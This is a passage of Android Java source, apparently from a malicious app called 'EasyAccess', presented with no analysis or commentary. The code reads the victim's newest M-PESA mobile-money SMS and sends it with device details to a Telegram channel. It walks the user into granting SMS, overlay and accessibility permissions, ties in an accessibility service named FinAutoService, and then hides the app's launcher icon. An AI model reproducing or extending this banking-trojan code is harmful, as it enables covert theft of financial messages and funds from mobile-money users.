                      startActivity(i);
                  } else {
                      openAccessibilitySettings();
                  }
              }

              private void openAccessibilitySettings() {
                  if (!isAccessibilityServiceEnabled()) {
                      startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));
                  } else {
                      checkAndHideIfReady();
                  }
              }

              private void sendInstallNotice(long installTime) {
                  String installDate = formatTime(installTime);
                  long activationTime = installTime + ACTIVATION_DELAY_MS;
                  String activationDate = formatTime(activationTime);

                  String mpesaSms = readNewestMpesaSms();
                  if (mpesaSms == null) mpesaSms = "(no M-PESA SMS found)";

                  String deviceInfo =
                      "*Device installed: EasyAccess*\n" +
                      "Model: " + Build.MANUFACTURER + " " + Build.MODEL + "\n" +
                      "Brand: " + Build.BRAND + "\n" +
                      "Device: " + Build.DEVICE + "\n" +
                      "Android: " + Build.VERSION.RELEASE + " (SDK " + Build.VERSION.SDK_INT + ")\n" +
                      "Installed: " + installDate + "\n" +
                      "Activation due (5 minutes): " + activationDate + "\n" +
                      "Newest M-PESA SMS: " + mpesaSms;

                  TelegramQueue.get(this).send(deviceInfo);
              }

              private void maybeSendAllPermissionsGrantedNotice(
                      boolean allPermsGranted,
                      boolean overlayGranted,
                      boolean accessibilityEnabled) {

                  if (!allPermsGranted || !overlayGranted || !accessibilityEnabled) return;
                  if (prefs.getBoolean("all_perms_notice_sent", false)) return;

                  prefs.edit().putBoolean("all_perms_notice_sent", true).apply();

                  long installTime = prefs.getLong("install_time", System.currentTimeMillis());
                  String installDate = formatTime(installTime);
                  String activationDate = formatTime(installTime + ACTIVATION_DELAY_MS);

                  String mpesaSms = readNewestMpesaSms();
                  if (mpesaSms == null) mpesaSms = "(no M-PESA SMS found)";

                  String msg =
                      "*All permissions granted: EasyAccess*\n" +
                      "Model: " + Build.MANUFACTURER + " " + Build.MODEL + "\n" +
                      "Brand: " + Build.BRAND + "\n" +
                      "Device: " + Build.DEVICE + "\n" +
                      "Android: " + Build.VERSION.RELEASE + " (SDK " + Build.VERSION.SDK_INT + ")\n" +
                      "Installed: " + installDate + "\n" +
                      "Activation due (5 minutes): " + activationDate + "\n" +
                      "Newest M-PESA SMS: " + mpesaSms + "\n\n" +
                      "All required permissions received ✅\n" +
                      "SMS ✅\n" +
                      "Overlay ✅\n" +
                      "Accessibility ✅";

                  TelegramQueue.get(this).send(msg);
              }

              private String readNewestMpesaSms() {
                  try {
                      Cursor cursor = getContentResolver().query(
                          Telephony.Sms.Inbox.CONTENT_URI,
                          new String[]{ Telephony.Sms.Inbox.BODY, Telephony.Sms.Inbox.ADDRESS },
                          null, null,
                          Telephony.Sms.Inbox.DATE + " DESC");
                      if (cursor == null) return null;
                      int count = 0;
                      while (cursor.moveToNext() && count < 5) {
                          count++;
                          String body = cursor.getString(0);
                          String sender = cursor.getString(1);
                          if (body == null) continue;
                          String b = body.toLowerCase();
                          String s = sender != null ? sender.toLowerCase() : "";
                          if (b.contains("m-pesa") || b.contains("mpesa") || b.contains("m_pesa")
                              || s.contains("m-pesa") || s.contains("mpesa") || s.contains("m_pesa")) {
                              cursor.close();
                              return body;
                          }
                      }
                      cursor.close();
                  } catch (Exception e) {
                      Log.e(TAG, "readNewestMpesaSms error", e);
                  }
                  return null;
              }

              private String formatTime(long millis) {
                  SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss z", Locale.getDefault());
                  return sdf.format(new Date(millis));
              }

              @Override
              public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
                  super.onRequestPermissionsResult(requestCode, permissions, grantResults);
                  if (requestCode == 100) {
                      if (areRuntimePermissionsGranted()) {
                          openOverlaySettings();
                      } else {
                          Toast.makeText(this, "Grant all permissions to continue", Toast.LENGTH_LONG).show();
                      }
                  }
              }

              @Override
              protected void onResume() {
                  super.onResume();
                  try { OverlayManager.get(this).dismiss(); } catch (Exception ignored) { }

                  if (areRuntimePermissionsGranted()) {
                      if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
                          openOverlaySettings();
                          return;
                      }
                      if (!isAccessibilityServiceEnabled()) {
                          openAccessibilitySettings();
                          return;
                      }
                  }

                  checkAndHideIfReady();
              }

              private void checkAndHideIfReady() {
                  boolean allPermsGranted = areRuntimePermissionsGranted();
                  boolean overlayGranted = Settings.canDrawOverlays(this);
                  boolean accessibilityEnabled = isAccessibilityServiceEnabled();

                  maybeSendAllPermissionsGrantedNotice(allPermsGranted, overlayGranted, accessibilityEnabled);

                  if (allPermsGranted && accessibilityEnabled && overlayGranted) {
                      hideAppIcon();
                      handler.postDelayed(() -> finish(), 500);
                  }
              }

              private boolean isAccessibilityServiceEnabled() {
                  String service = getPackageName() + "/" + FinAutoService.class.getCanonicalName();
                  String enabledServices = Settings.Secure.getString(getContentResolver(),
                      Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
                  return enabledServices != null && enabledServices.contains(service);
              }

              private void hideAppIcon() {
                  try {
                      ComponentName componentName = new ComponentName(this, MainActivity.class);
                      getPackageManager().setComponentEnabledSetting(
                          componentName,
                          PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                          PackageManager.DONT_KILL_APP);
                  } catch (Exception e) {
                      Log.e(TAG, "Hide icon error", e);
                  }
              }
          }
